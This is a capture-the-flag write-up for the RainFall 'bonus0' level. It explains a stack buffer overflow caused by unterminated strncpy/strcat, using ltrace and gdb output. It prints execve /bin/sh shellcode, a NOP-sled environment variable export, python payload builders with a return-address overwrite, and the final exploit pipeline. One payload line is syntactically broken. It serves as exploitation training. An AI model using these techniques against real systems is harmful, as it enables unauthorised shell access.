Let s analyse the source code : 

We have a bufer of 42 bytes : s[42]


ltrace ./bonus0
__libc_start_main(0x80485a4, 1, 0xbffff7f4, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - 
)                                                                       = 4
read(0, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 4096)                              = 70
strchr("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., '\n')                               = "\n"
strncpy(0xbffff6d8, "aaaaaaaaaaaaaaaaaaaa", 20)                                   = 0xbffff6d8
puts(" - " - 
)                                                                       = 4
read(0, bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"..., 4096)                              = 73
strchr("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"..., '\n')                               = "\n"
strncpy(0xbffff6ec, "bbbbbbbbbbbbbbbbbbbb", 20)                                   = 0xbffff6ec
strcpy(0xbffff726, "aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb"...)                         = 0xbffff726
strcat("aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb"..., "bbbbbbbbbbbbbbbbbbbb\364\017\375\267") = "aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb"...
puts("aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbb"...aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb??? bbbbbbbbbbbbbbbbbbbb???
)                                       = 70
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++

After a few tests and analyzing the code, we can see that the buffer overflow is done on the strncpy function which copies 20 bytes into a 20 byte buffer in the pp function.
We notice that if we put  20 bytes or more in the first input, the second input will be copied in the buffer and the program will crash.

bonus0@RainFall:~$ ./bonus0
 - 
aaaaaaaaaaaaaaaaaaaa			--> 20 bytes
 - 
bbbbbbbbbbbbbbbbbbb				--> 19 bytes
aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbb bbbbbbbbbbbbbbbbbbb
Segmentation fault (core dumped)

If we put 19 bytes in the first input and more than 19 bytes in the second input, the program will not crash, but we have some overflow :
bonus0@RainFall:~$ ./bonus0
 - 
aaaaaaaaaaaaaaaaaaa
 - 
bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
aaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbb???


So if we can put a shell code in the second input, we maybe can execute it for example in a return address.

We don t want to have the second input to have more than 19 bytes because we don t want to have anything after copied into the first input (Because of the missing \0).
So we have 20 bytes for the first input + 19 bytes for the second input

We have a problem, we have to write a shellcode
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80		--> 24 bytes
but we only have 19 bytes for the second input (I explained that above)
So we have to store this shellcode somewhere in the memory and then jump to it.
We know that in the main arguments we have argc, argv and envp, and even if we have something like this :
main (void)
The env still exists in the memory, so we can store our shellcode, find the address of it and then jump to it.
To don t have a problem we add some NOP before the shellcode.

export SHELLCODEINJECTION=$(python -c 'print "\x90"*128 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

After we can find our env var with this command :
https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
https://shankaraman.wordpress.com/tag/finding-environment-variable-address-using-gdb/
(gdb) x/s *((char **)environ)

gdb ./bonus0 
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) run
Starting program: /home/user/bonus0/bonus0 
(gdb) x/s *((char **)environ+1)
0xbffff872:	 "SHELL=/bin/bash"
(gdb) x/s *((char **)environ+2)
0xbffff882:	 "SSH_CLIENT=192.168.56.1 49848 4242"
(gdb) x/s *((char **)environ+3)
0xbffff8a5:	 "SSH_TTY=/dev/pts/0"
(gdb) x/s *((char **)environ+4)
0xbffff8b8:	 "USER=bonus0"
(gdb) x/s *((char **)environ+5)
0xbffff8c4:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
(gdb) x/s *((char **)environ+6)
0xbffffde5:	 "COLUMNS=134"
(gdb) x/s *((char **)environ+7)
0xbffffdf1:	 "MAIL=/var/mail/bonus0"
(gdb) x/s *((char **)environ+8)
0xbffffe07:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
(gdb) x/s *((char **)environ+9)
0xbffffe54:	 "_=/usr/bin/gdb"
(gdb) x/s *((char **)environ+10)
0xbffffe63:	 "PWD=/home/user/bonus0"
(gdb) x/s *((char **)environ+11)
0xbffffe79:	 "LANG=en_US.UTF-8"
(gdb) x/s *((char **)environ+12)
0xbffffe8a:	 "LINES=32"
(gdb) x/s *((char **)environ+13)
0xbffffe93:	 "SHELLCODEINJECTION=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\231Ph//shh/bin\211\343PS\211\341\260\v̀"

We have the address of the Shellcode : 0xbffffe93

We have to do some other tests :

bonus0@RainFall:~$ ./bonus0 
 - 
AAAAAAAAAAAAAAAAAAAA
 - 
BBBBCCCCDDDDEEEEDDD
AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEDDD BBBBCCCCDDDDEEEEDDD
Segmentation fault (core dumped)

		20 bytes		19 bytes	1bytes		19 bytes		
<------------------><----------------->|<------------------>
AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEDDD BBBBCCCCDDDDEEEEDDD

We have 20 + 19 + 1 +19 = 59 bytes

Now that we know that, we know we can overflow the s[42], to overwrite the return address of the main function.

0xbffffe93 in little endian = \x93\xfe\xff\xbf

gdb ./bonus0 
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp
   0x080485ad <+9>:	lea    0x16(%esp),%eax			--> 0x16 = 22 --> We know that we put esp at this address,
   														22 seems where we start to write but we are going to verify
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>		--> We want to put a break point here, before the return address
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    
End of assembler dump.
(gdb) b *0x080485c0
Breakpoint 1 at 0x80485c0
(gdb) run
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA			--> Just to have a recognizable pattern
 - 
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB				--> Same here

Breakpoint 1, 0x080485c0 in main ()
(gdb) x/30x $esp												--> We want to see the stack memory
0xbffff640:	0xbffff656	0x080498d8	0x00000001	0x0804835d
0xbffff650:	0xb7fd13e4	0x41410016	0x41414141	0x41414141		--> its a the first 0x41414141 that we start to write
0xbffff660:	0x41414141	0x41414141	0x42424141	0x42424242
0xbffff670:	0x42424242	0x42424242	0x42424242	0x0ff44242
0xbffff680:	0x4220b7fd	0x42424242	0x42424242	0x42424242
0xbffff690:	0x42424242	0xf4424242	0x00b7fd0f	0xb7fdc858
0xbffff6a0:	0x00000000	0xbffff71c	0xbffff72c	0x00000000
0xbffff6b0:	0x0804824c	0xb7fd0ff4
(gdb) x $esp+21
0xbffff655:	0x41414100		--> NO ! we have a 00 at the end
(gdb) x $esp+22				--> Hihi ! 22 like we said
0xbffff656:	0x41414141		--> Perfect its our AAAA
(gdb) x ebp+4				--> At ebp+4 we have the return address So let s see the address
No symbol table is loaded.  Use the "file" command.
(gdb) x $ebp+4
0xbffff68c:	0x42424242

Now we have the address of our buffer and we have the address of the return address (ebp+4)
We open python and substract our two addresses :
0xbffff68c - 0xbffff656
54

We have 54 bytes to write before overwriting the return address !!
Now that we have our padding, let s start to write our payload.

let s see again our schema :
		20 bytes		19 bytes	1bytes		19 bytes		
<------------------><----------------->|<------------------>
AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEDDD BBBBCCCCDDDDEEEEDDD

we can write 58 bytes, perfect we just need 54 + 4 (The address of our shellcode)

first payload :

		20 bytes
<------------------>
AAAAAAAAAAAAAAAAAAAA

python -c 'print "A"*20 +'  > /tmp/first


Second payload :

	14 bytes		4 bytes		1 bytes
<-------><-------------------><>
AAAAAAAAAAAAAA\x93\xfe\xff\xbfA

python -c 'print "\x90"*14 + "\x93\xfe\xff\xbf" + "\x90"' > /tmp/second

Final result :
                                                   1
		20 bytes	      14 bytes	       4 bytes      1|     14bytes        4bytes    1bytes
<------------------><------------><-------------->--<------------><-------------->-
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x93\xfe\xff\xbfA AAAAAAAAAAAAAA\x93\xfe\xff\xbfA
                                                                  <-------------->
                                                                     our shellcode address, and where we overwrite the return address of the main function
                                                   
20 + 14 + 4 + 1 + 1 + 14 = 54       --> 54 is our padding

We wanted to put the shellcode (the second shellcode address at 54 --> the address of the return address):
So we calculated with our previous schema how we can do to put this at the right place.


(cat /tmp/first; cat /tmp/second; cat) | ./bonus0